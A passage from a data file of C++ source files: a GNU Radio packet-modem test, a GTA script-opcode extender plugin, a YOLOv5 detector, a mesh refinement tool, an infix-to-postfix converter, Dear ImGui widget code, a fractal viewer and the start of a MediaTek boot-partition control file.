fg.emplaceBlock<gr::packet_modem::VectorSink<gr::packet_modem::Pdu<int>>>();\n    expect(\n        eq(gr::ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(to_stream)));\n    expect(eq(gr::ConnectionResult::SUCCESS,\n              fg.connect<\"out\">(to_stream).to<\"in\">(process)));\n    expect(\n        eq(gr::ConnectionResult::SUCCESS, fg.connect<\"out\">(process).to<\"in\">(to_pdu)));\n    expect(eq(gr::ConnectionResult::SUCCESS, fg.connect<\"out\">(to_pdu).to<\"in\">(sink)));\n    expect(eq(gr::ConnectionResult::SUCCESS,\n              fg.connect<\"out\">(source).to<\"in\">(process_pdu)));\n    expect(eq(gr::ConnectionResult::SUCCESS,\n              fg.connect<\"out\">(process_pdu).to<\"in\">(sink_pdu)));\n    gr::scheduler::Simple sched{ std::move(fg) };\n    expect(sched.runAndWait().has_value());\n\n    for (const auto& p : sink.data()) {\n        fmt::println(\"pdu.data = {}\", p.data);\n    }\n\n    for (const auto& p : sink_pdu.data()) {\n        fmt::println(\"pdu.data = {}\", p.data);\n    }\n\n    return 0;\n}\n",
    "#include \"plugin.h\"\n#include \"CRunningScript.h\"\n#include \"CTheScripts.h\"\n#include \"CMessages.h\"\n//#include \"ScmExtenderAPI.h\"\n\nclass ScmExtender {\npublic: \n    static inline std::unordered_map<int32_t, int8_t(*)(int32_t*)> mapOfNewOpcodes = {};\n\n    static __declspec(dllexport) void AddOneCommand(int32_t command, int8_t(*func)(int32_t*)) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end())\n            std::cout << \"[SCRIPT] Command id \" << command << \" overwritten\" << std::endl;\n\n        mapOfNewOpcodes[command] = func;\n    }\n\n    static inline CRunningScript* currentScript = nullptr;\n    static __declspec(dllexport) void CollectParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->CollectParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void StoreParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->StoreParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void UpdateCompareFlag(uint8_t flag) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->UpdateCompareFlag(flag);\n    }\n\n    static int8_t ProcessOneCommand(CRunningScript* script) {\n        ++CTheScripts::CommandsExecuted;\n\n        int32_t m_nPrevIp = script->m_nIp;\n        int32_t command = CTheScripts::ScriptSpace[script->m_nIp + 1] << 8 | CTheScripts::ScriptSpace[script->m_nIp];\n        script->m_nIp += sizeof(uint16_t);\n        script->m_bNotFlag = (command & 0x8000);\n        command &= 0x7FFF;\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end()) {\n            currentScript = script;\n            tScriptParam* params = CTheScripts::ScriptParams;\n            return f->second((int32_t*)params);\n        }\n\n        script->m_nIp = m_nPrevIp;\n        --CTheScripts::CommandsExecuted;\n\n        return script->ProcessOneCommand();\n    }\n\n    ScmExtender() {\n        plugin::Events::initRwEvent += []() {\n            CTheScripts::ScriptSpace = plugin::patch::Get<uint8_t*>(0x4387A0 + 3);\n        };\n\n        auto processScriptHook = [](CRunningScript* script, void*) {\n            if (script->m_bUseMissionCleanup)\n                script->DoDeathArrestCheck();\n\n            if (script->m_bIsMission && CTheScripts::FailCurrentMission == 1 && script->m_nSP == 1)\n                script->m_nIp = script->m_anStack[--script->m_nSP];\n\n            if (CTimer::m_snTimeInMilliseconds >= script->m_nWakeTime) {\n                while (!ProcessOneCommand(script)) {\n                }\n            }\n\n            if (!script->m_bAwake)\n                return;\n\n            if (!(CPad::GetPad(0)->NewState.ButtonCross && !CPad::GetPad(0)->OldState.ButtonCross))\n                return;\n\n            script->m_nWakeTime = 0;\n\n            for (int i = 0; i < 6; i++) {\n                if (CMessages::BIGMessages[i].m_Stack[0].m_pText != nullptr)\n                    CMessages::BIGMessages[i].m_Stack[0].m_nStartTime = 0;\n            }\n\n            if (CMessages::BriefMessages[0].m_pText != nullptr)\n                CMessages::BriefMessages[0].m_nStartTime = 0;\n        };\n        plugin::patch::RedirectCall(0x4393DF, LAMBDA(void, __fastcall, processScriptHook, CRunningScript*, void*));\n    }\n} scmExtender;\n",
    "#include <fstream>\n#include <opencv2/opencv.hpp>\n#include \"utils.h\"\n\nusing namespace std;\n\nvoid predictOnVideo(const auto webcamId, const bool isCuda = false)\n{\n    Yolov5Detector detector(\"../assets/models/yolov5s.onnx\", \"../assets/classes.txt\", isCuda);\n    Yolov5Detector::DetectionData output;\n\n    cv::VideoCapture cap(webcamId);\n    cv::Mat frame, resultImg;\n\n    cap.set(3, 640);\n    cap.set(4, 480);\n\n    while (true)\n    {\n        cap.read(frame);\n        output = detector.detect(frame, true);\n        resultImg = output.image;\n        cv::imshow(\"Webcam \" + webcamId, resultImg);\n\n        if ((cv::waitKey(1) & 0xFF) == 27)\n        {\n            break;\n        }\n    }\n}\n\nvoid predictOnImage(string imagePath, bool isCuda = false)\n{\n    Yolov5Detector detector(\"../assets/models/yolov5s.onnx\", \"../assets/classes.txt\", isCuda);\n\n    cv::Mat image = cv::imread(imagePath);\n    if (image.empty())\n    {\n        cerr << \"Error loading image\\n\";\n    }\n\n    Yolov5Detector::DetectionData output;\n    output = detector.detect(image, true);\n\n    cv::Mat resultImg = output.image;\n    vector<Yolov5Detector::Detection> detections = output.detections;\n\n    cv::imshow(\"result image\", resultImg);\n    cv::waitKey(0);\n}\n\nint findType(const string &path)\n{\n    vector<string> image_extensions = {\".jpg\", \".jpeg\", \".png\"};\n    for (const string &ext : image_extensions)\n    {\n        string lower_path = path;\n        transform(lower_path.begin(), lower_path.end(), lower_path.begin(), ::tolower);\n        if (lower_path.size() >= ext.size() && lower_path.substr(lower_path.size() - ext.size()) == ext)\n        {\n            return 0;\n        }\n    }\n\n    vector<string> video_extensions = {\".mp4\", \".avi\"};\n    for (const string &ext : video_extensions)\n    {\n        if (path.size() >= ext.size() && path.substr(path.size() - ext.size()) == ext)\n        {\n            return 1;\n        }\n    }\n\n    try\n    {\n        stod(path);\n        return 2;\n    }\n    catch (const invalid_argument &)\n    {\n        // Not a number, continue\n    }\n    catch (const out_of_range &)\n    {\n        // Not a number, continue\n    }\n\n    return -1;\n}\n\nint main(int argc, const char *argv[])\n{\n    bool isCuda = argc > 1 && strcmp(argv[1], \"cuda\") == 0;\n\n    string input = argv[1];\n    int type = findType(input);\n    if (type == -1)\n    {\n        cout << \"Please specify a valid type\" << endl;\n        return -1;\n    }\n    else if (type == 0)\n    {\n        predictOnImage(input, isCuda);\n    }\n    else if (type == 1)\n    {\n        predictOnVideo(input, isCuda);\n    }\n    else if (type == 2)\n    {\n        predictOnVideo(stoi(input), isCuda);\n    }\n}",
    "//#define Check_Flip_Tets\n#include <mtet/mtet.h>\n#include <mtet/io.h>\n#include <ankerl/unordered_dense.h>\n#include <span>\n#include <queue>\n#include <optional>\n#include <SmallVector.h>\n\n#include <implicit_functions.h>\n#include <subdivide_multi.h>\n#include <CLI/CLI.hpp>\n#include <tet_quality.h>\n#include <timer.h>\n#include <grid_mesh.h>\n\n\nusing namespace mtet;\n\nbool save_mesh_json(const std::string& filename,\n                    const mtet::MTetMesh mesh)\n{\n    vector<array<double, 3>> vertices((int)mesh.get_num_vertices());\n    vector<array<size_t, 4>> tets((int)mesh.get_num_tets());\n    using IndexMap = ankerl::unordered_dense::map<uint64_t, size_t>;\n    IndexMap vertex_tag_map;\n    vertex_tag_map.reserve(mesh.get_num_vertices());\n    int counter = 0;\n    mesh.seq_foreach_vertex([&](VertexId vid, std::span<const Scalar, 3> data){\n        size_t vertex_tag = vertex_tag_map.size() + 1;\n        vertex_tag_map[value_of(vid)] = vertex_tag;\n        vertices[counter] = {data[0], data[1], data[2]};\n        counter ++;\n    });\n    counter = 0;\n    mesh.seq_foreach_tet([&](TetId, std::span<const VertexId, 4> data) {\n        tets[counter] = {vertex_tag_map[value_of(data[0])] - 1, vertex_tag_map[value_of(data[1])] - 1, vertex_tag_map[value_of(data[2])] - 1, vertex_tag_map[value_of(data[3])] - 1};\n        counter ++;\n    });\n    if (std::filesystem::exists(filename.c_str())){\n        std::filesystem::remove(filename.c_str());\n    }\n    using json = nlohmann::json;\n    std::ofstream fout(filename.c_str(),std::ios::app);\n    json jOut;\n    jOut.push_back(json(vertices));\n    jOut.push_back(json(tets));\n    fout << jOut.dump(4, ' ', true, json::error_handler_t::replace) << std::endl;\n    fout.close();\n    return true;\n}\n\nbool save_function_json(const std::string& filename,\n                        const mtet::MTetMesh mesh,\n                        ankerl::unordered_dense::map<uint64_t, llvm_vecsmall::SmallVector<std::array<double, 4>, 20>> vertex_func_grad_map,\n                        const size_t funcNum)\n{\n    vector<vector<double>> values(funcNum);\n    for (size_t funcIter = 0; funcIter <  funcNum; funcIter++){\n        values[funcIter].reserve(((int)mesh.get_num_vertices()));\n    }\n    mesh.seq_foreach_vertex([&](VertexId vid, std::span<const Scalar, 3> data){\n        llvm_vecsmall::SmallVector<std::array<double, 4>, 20> func_gradList(funcNum);\n        func_gradList = vertex_func_grad_map[value_of(vid)];\n        for (size_t funcIter = 0; funcIter < funcNum; funcIter++){\n            cout << data[0] << \" \" << data[1] << \" \" << data[2] << \": \" << func_gradList[funcIter][0] << \", \" << func_gradList[funcIter][1] << \", \" << func_gradList[funcIter][2] << \", \" << func_gradList[funcIter][3] << endl;\n            values[funcIter].push_back(func_gradList[funcIter][0]);\n        }\n    });\n    if (std::filesystem::exists(filename.c_str())){\n        std::filesystem::remove(filename.c_str());\n    }\n    using json = nlohmann::json;\n    std::ofstream fout(filename.c_str(),std::ios::app);\n    json jOut;\n    for (size_t funcIter = 0; funcIter <  funcNum; funcIter++){\n        json jFunc;\n        jFunc[\"type\"] = \"customized\";\n        jFunc[\"value\"] = values[funcIter];\n        jOut.push_back(jFunc);\n    }\n    fout << jOut.dump(4, ' ', true, json::error_handler_t::replace) << std::endl;\n    fout.close();\n    return true;\n}\n//hash for mounting a boolean that represents the activeness to a tet\n//since the tetid isn't const during the process, mount the boolean using vertexids of 4 corners.\nuint64_t vertexHash(std::span<VertexId, 4>& x)\n{\n    ankerl::unordered_dense::hash<uint64_t> hash_fn;\n    return hash_fn(value_of(x[0])) + hash_fn(value_of(x[1])) + hash_fn(value_of(x[2])) + hash_fn(value_of(x[3]));\n}\n\nint main(int argc, const char *argv[])\n{\n    struct\n    {\n        string mesh_file;\n        string function_file;\n        double threshold = 0.0001;\n        double alpha = std::numeric_limits<double>::infinity();\n        int max_elements = -1;\n        double smallest_edge_length = 0;\n        string method = \"IA\";\n        string csg_file;\n        bool bfs = false;\n        bool dfs = false;\n        bool curve_network = false;\n        //bool analysis_mode = false;\n    } args;\n    CLI::App app{\"Longest Edge Bisection Refinement\"};\n    app.add_option(\"mesh\", args.mesh_file, \"Initial mesh file\")->required();\n    app.add_option(\"function\", args.function_file, \"Implicit function file\")->required();\n    app.add_option(\"-t,--threshold\", args.threshold, \"Threshold value\");\n    app.add_option(\"-a,--alpha\", args.alpha, \"Alpha value\");\n    app.add_option(\"-o,--option\", args.method, \"Options of implicit manifold\");\n    app.add_option(\"--tree\", args.csg_file, \"CSG Tree file\");\n    app.add_option(\"-m,--max-elements\", args.max_elements, \"Maximum number of elements\");\n    app.add_option(\"-s,--shortest-edge\", args.smallest_edge_length, \"Shortest edge length\");\n    app.add_option(\"-b, --bfs\", args.bfs, \"Toggle BFS Mode\");\n    app.add_option(\"-d, --dfs\", args.dfs, \"Togg",
    "#include <iostream>\r\n#include <cstring> // For strcat()\r\nclass Convert {\r\nprivate:\r\n char infix[20];\r\n char postfix[20];\r\n char s[20];\r\n int top;\r\n int i;\r\n int p;\r\npublic:\r\n Convert() {\r\n top = -1;\r\n i = p = 0;\r\n std::cout << \"\\nEnter infix Expression:\";\r\n std::cin >> infix;\r\n strcat(infix, \")\");\r\n s[++top] = '(';\r\n }\r\n int precedence(char);\r\n void post();\r\n void display();\r\n};\r\nint Convert::precedence(char ch) {\r\n switch(ch) {\r\n case '^': return 3;\r\n case '*': return 2;\r\n case '/': return 2;\r\n case '+': return 1;\r\n case '-': return 1;\r\n default: return 0;\r\n }\r\n}\r\nvoid Convert::post() {\r\n char ch;\r\n while (top != -1) {\r\n ch = infix[i++];\r\n if ((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') || (ch >= '1' && ch <= '9'))\r\n postfix[p++] = ch;\r\n else if (ch == '(')\r\n s[++top] = ch;\r\n else if (ch == '+' || ch == '-' || ch == '*' || ch == '/' || ch == '^') {\r\n while (precedence(ch) <= precedence(s[top]))\r\n postfix[p++] = s[top--];\r\n s[++top] = ch;\r\n } else if (ch == ')') {\r\n while (s[top] != '(')\r\n postfix[p++] = s[top--];\r\n top--;\r\n } else\r\n std::cout << \"\\nWrong string\";\r\n }\r\n postfix[p] = '\\0';\r\n}\r\nvoid Convert::display() {\r\n std::cout << \"\\nPostfix Expression is: \" << postfix;\r\n}\r\nint main() {\r\n Convert c;\r\n c.post();\r\n c.display();\r\n return 0;\r\n}\r\n\r\n",
    "// dear imgui, v1.75 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n#include \"imgui_internal.h\"\n\n#include <ctype.h>      // toupper\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>     // intptr_t\n#else\n#include <stdint.h>     // intptr_t\n#endif\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127) // condition expression is constant\n#pragma warning (disable: 4996) // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#pragma clang diagnostic ignored \"-Wold-style-cast\"         // warning : use of old-style cast                              // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"            // warning : comparing floating point with == or != is unsafe   // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"      // warning : format string is not a string literal              // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"        // warning : implicit conversion changes signedness             //\n#if __has_warning(\"-Wzero-as-null-pointer-constant\")\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning : zero as null pointer constant              // some standard header variations use #define NULL 0\n#endif\n#if __has_warning(\"-Wdouble-promotion\")\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"       // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#endif\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"        // warning: format not a string literal, format string not checked\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n// Data\n//-------------------------------------------------------------------------\n\n// Those MIN/MAX values are not define because we need to point to them\nstatic const signed char    IM_S8_MIN  = -128;\nstatic const signed char    IM_S8_MAX  = 127;\nstatic const unsigned char  IM_U8_MIN  = 0;\nstatic const unsigned char  IM_U8_MAX  = 0xFF;\nstatic const signed short   IM_S16_MIN = -32768;\nstatic const signed short   IM_S16_MAX = 32767;\nstatic const unsigned short IM_U16_MIN = 0;\nstatic const unsigned short IM_U16_MAX = 0xFFFF;\nstatic const ImS32          IM_S32_MIN = INT_MIN;    // (-2147483647 - 1), (0x80000000);\nstatic const ImS32          IM_S32_MAX = INT_MAX;    // (2147483647), (0x7FFFFFFF)\nstatic const ImU32          IM_U32_MIN = 0;\nstatic const ImU32          IM_U32_MAX = UINT_MAX;   // (0xFFFFFFFF)\n#ifdef LLONG_MIN\nstatic const ImS64          IM_S64_MIN = LLONG_MIN;  // (-9223372036854775807ll - 1ll);\nstatic const ImS64          IM_S64_MAX = LLONG_MAX;  // (9223372036854775807ll);\n#else\nstatic const ImS64          IM_S64_MIN = -9223372036854775807LL - 1;\nstatic const ImS64          IM_S64_MAX = 9223372036854775807LL;\n#endif\nstatic const ImU64          IM_U64_MIN = 0;\n#ifdef ULLONG_MAX\nstatic const ImU64          IM_U64_MAX = ULLONG_MAX; // (0xFFFFFFFFFFFFFFFFull);\n#else\nstatic const ImU64          IM_U64_MAX",
    "\ufeff#include <SFML/Graphics.hpp>\r\n#include <ccomplex>\r\n#include <iostream>\r\n#include <string>\r\n#include <Windows.h>\r\n#include <atlstr.h>\r\n#include <random>\r\n\r\n\r\n\r\n\r\n\r\nusing namespace sf;\r\n\r\nstd::complex<double> mandelbrot(std::complex<double> z, std::complex<double> c)\r\n{\r\n    \r\n    std::complex<double> z1(0, 0);\r\n    z1 = z * z + c;\r\n\r\n\r\n\r\n    return z1;\r\n}\r\n\r\n\r\nint IsM(std::complex<double> c, int mx)\r\n{\r\n    std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nint IsJ(std::complex<double> z, int mx, std::complex<double> c)\r\n{\r\n    std::complex<double> f(-0.7514f, -0.826f);\r\n    //std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nvoid update(int WIDTH, int HEIGHT, double ofX, double ofY, RenderWindow& window, RectangleShape shape, double scale, int maxIt, int Fnum, std::complex<double> cForJ)\r\n{\r\n\r\n    window.clear();\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2 + ofX) * scale;\r\n            double y = (j - HEIGHT / 2 + ofY) * scale;\r\n\r\n            y = -y;\r\n            if (Fnum==0)\r\n            {\r\n                Uint8 clr = IsM(std::complex<double>(x, y), maxIt);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n            else if(Fnum == 1)\r\n            {\r\n                Uint8 clr = IsJ(std::complex<double>(x, y), maxIt, cForJ);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n\r\n\r\n            \r\n            /*if (IsM(std::complex<double>(x, y), 100))\r\n            {\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }*/\r\n        }\r\n    }\r\n\r\n\r\n    window.display();\r\n}\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"Russian\");\r\n    int MaxIt = 50;\r\n    bool start = true;\r\n    int m = 0;\r\n    \r\n    std::complex<double> cForJ(-0.64, 0.39);\r\n    if (start)\r\n    {\r\n        std::cout << \"\u0413\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u043e\u0432\\n\";\r\n        std::cout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0443\u043c \u0438\u0442\u0435\u0440\u0430\u0446\u0438\u0439 (\u043c\u0435\u043d\u044c\u0448\u0435 - \u043b\u0443\u0447\u0448\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c, \u043d\u043e \u0445\u0443\u0436\u0435 \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u044c \u0438 \u044f\u0440\u0447\u0435 \u0433\u0440\u0430\u0434\u0438\u0435\u043d\u0442): \";\r\n        std::cin >> MaxIt;\r\n        std::cout << \"\u0414\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u044b:\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u041c\u043e\u043d\u0434\u0435\u043b\u044c\u0431\u0440\u043e\u0442\u0430: 0\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0416\u044e\u043b\u0438\u0430: 1\\n\";\r\n        std::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e: \";\r\n        std::cin >> m;\r\n        std::cout << \"\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435\\n\u0421\u0442\u0440\u0435\u043b\u043e\u0447\u043a\u0438: \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Shift: \u0443\u0432\u0435\u043b\u0438\u0447\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Alt: \u0443\u043c\u0435\u043d\u044c\u0448\u0435\u043d\u0438\u0435\\nU: \u043e\u0431\u043d\u043e\u0432\u0438\u0442\u044c \u044d\u043a\u0440\u0430\u043d\\n\";\r\n        std::cout << \"\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0441\u0434\u0435\u043b\u0430\u043d\u0430 \u0432 \u0440\u0430\u043c\u043a\u0430\u0445 \u043f\u0440\u043e\u0435\u043a\u0442\u043d\u043e\u0439 \u0434\u0435\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438\\n\u0428\u043a\u043e\u043b\u0430 \u21161580, 2024 \u0433.\";\r\n        \r\n        \r\n    }\r\n    std::complex<double> z(0, 0);\r\n    std::int32_t WIDTH = 200;\r\n    std::int32_t HEIGHT = 200;\r\n    double Y=0;\r\n    double X=0;\r\n\r\n    double ofX = 0;\r\n    double ofY = 0;\r\n    double scale = 0.01f;\r\n    RenderWindow window(VideoMode(WIDTH, HEIGHT), L\"\u0424\u0440\u0430\u043a\u0442\u0430\u043b\", Style::Default);\r\n    RenderWindow test(VideoMode(WIDTH, HEIGHT), L\"\u0412\u044b\u0431\u043e\u0440 \u0442\u043e\u0447\u043a\u0438\", Style::Titlebar);\r\n    \r\n    Vector2i pos = window.getPosition();\r\n    pos.x += WIDTH;\r\n\r\n    test.setPosition(pos);\r\n    \r\n    if (m!=1) \r\n    {\r\n        test.close();             \r\n    }\r\n    \r\n\r\n    window.setVerticalSyncEnabled(true);\r\n    \r\n\r\n    CircleShape sh;\r\n    sh.setScale({ 1.f,1.f });\r\n    sh.setRadius(0.5f);\r\n    sh.setFillColor(Color::Black);\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2)/50;\r\n            double y = (j - HEIGHT / 2)/50;\r\n\r\n            y = -y;\r\n            \r\n            Uint8 c = IsM(std::complex<double>(x,y),MaxIt)/2;\r\n            auto GREY = Color{c, c, c };\r\n            sh.setFillColor(GREY);\r\n            sh.setPosition(i, j);\r\n            test.draw(sh);\r\n            sh.setFillColor(Color::Black);\r\n            if (i == WIDTH/2 || j == HEIGHT/2)\r\n            {\r\n                sh.setFillColor(Color::White);\r\n                sh.setPosition(i, j);\r\n                test.draw(sh);\r\n                \r\n            }\r\n\r\n        }\r\n    }\r\n    test.display();\r\n\r\n\r\n    RectangleShape shape;\r\n    shape.setSize({ 1.f, 1.f });\r\n    shape.setFillColor(Color::White);\r\n\r\n    \r\n\r\n\r\n    update(WIDTH, HEIGHT, ofX, ofY, window, shape, scale, MaxIt, m, cForJ);\r\n    while (window.isOpen())\r\n    {\r\n        if (window.hasFocus())\r\n        {\r\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Left))\r\n            {\r\n                ofX -= 50;\r\n                update(W",
    "/*****************************************************************************\n*  Copyright Statement:\n*  --------------------\n*  This software is protected by Copyright and the information contained\n*  herein is confidential. The software may not be copied and the information\n*  contained herein may not be used or disclosed except with the written\n*  permission of MediaTek Inc. (C) 2020\n*\n*  BY OPENING THIS FILE, BUYER HEREBY UNEQUIVOCALLY ACKNOWLEDGES AND AGREES\n*  THAT THE SOFTWARE/FIRMWARE AND ITS DOCUMENTATIONS (\"MEDIATEK SOFTWARE\")\n*  RECEIVED FROM MEDIATEK AND/OR ITS REPRESENTATIVES ARE PROVIDED TO BUYER ON\n*  AN \"AS-IS\" BASIS ONLY. MEDIATEK EXPRESSLY DISCLAIMS ANY AND ALL WARRANTIES,\n*  EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF\n*  MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE OR NONINFRINGEMENT.\n*  NEITHER DOES MEDIATEK PROVIDE ANY WARRANTY WHATSOEVER WITH RESPECT TO THE\n*  SOFTWARE OF ANY THIRD PARTY WHICH MAY BE USED BY, INCORPORATED IN, OR\n*  SUPPLIED WITH THE MEDIATEK SOFTWARE, AND BUYER AGREES TO LOOK ONLY TO SUCH\n*  THIRD PARTY FOR ANY WARRANTY CLAIM RELATING THERETO. MEDIATEK SHALL ALSO\n*  NOT BE RESPONSIBLE FOR ANY MEDIATEK SOFTWARE RELEASES MADE TO BUYER'S\n*  SPECIFICATION OR TO CONFORM TO A PARTICULAR STANDARD OR OPEN FORUM.\n*\n*  BUYER'S SOLE AND EXCLUSIVE REMEDY AND MEDIATEK'S ENTIRE AND CUMULATIVE\n*  LIABILITY WITH RESPECT TO THE MEDIATEK SOFTWARE RELEASED HEREUNDER WILL BE,\n*  AT MEDIATEK'S OPTION, TO REVISE OR REPLACE THE MEDIATEK SOFTWARE AT ISSUE,\n*  OR REFUND ANY SOFTWARE LICENSE FEES OR SERVICE CHARGE PAID BY BUYER TO\n*  MEDIATEK FOR SUCH MEDIATEK SOFTWARE AT ISSUE.\n*\n*  THE TRANSACTION CONTEMPLATED HEREUNDER SHALL BE CONSTRUED IN ACCORDANCE\n*  WITH THE LAWS OF THE STATE OF CALIFORNIA, USA, EXCLUDING ITS CONFLICT OF\n*  LAWS PRINCIPLES.  ANY DISPUTES, CONTROVERSIES OR CLAIMS ARISING THEREOF AND\n*  RELATED THERETO SHALL BE SETTLED BY ARBITRATION IN SAN FRANCISCO, CA, UNDER\n*  THE RULES OF THE INTERNATIONAL CHAMBER OF COMMERCE (ICC).\n*\n*****************************************************************************/\n\n#include <errno.h>\n#include <fcntl.h>\n#include <string.h>\n#include <string>\n#include <android-base/logging.h>\n\n#if !defined(ARCH_X86)\n#include <ufs-mtk-ioctl.h>\n#include <sys/ioctl.h>\n#endif\n\n#include \"boot_region_control_private.h\"\n\nnamespace android {\nnamespace bootable {\n#if !defined(ARCH_X86)\nstatic bool ufs_set_active_boot_part(int boot)\n{\n    struct ufs_ioctl_query_data idata;\n    unsigned char buf[1];\n    int fd, ret = true;\n\n    fd = open(\"/dev/block/sdc\", O_RDWR);\n    if (fd < 0) {\n        printf(\"%s: open device failed, err: %d\\n\", __func__, fd);\n        return false;\n    }\n\n    buf[0] = boot;           /* 1: BootLU A, 2: BootLU B */\n\n    idata.opcode = UPIU_QUERY_OPCODE_WRITE_ATTR;\n    idata.idn = QUERY_ATTR_IDN_BOOT_LUN_EN;\n    idata.idx = 0;\n    idata.buf_ptr = &buf[0];\n    idata.buf_byte = 1;\n\n    if (ioctl(fd, UFS_IOCTL_QUERY, &idata) < 0) {\n      LOG(ERROR) << \"ufs_set boot_part fail\";\n      ret = false;\n    }\n    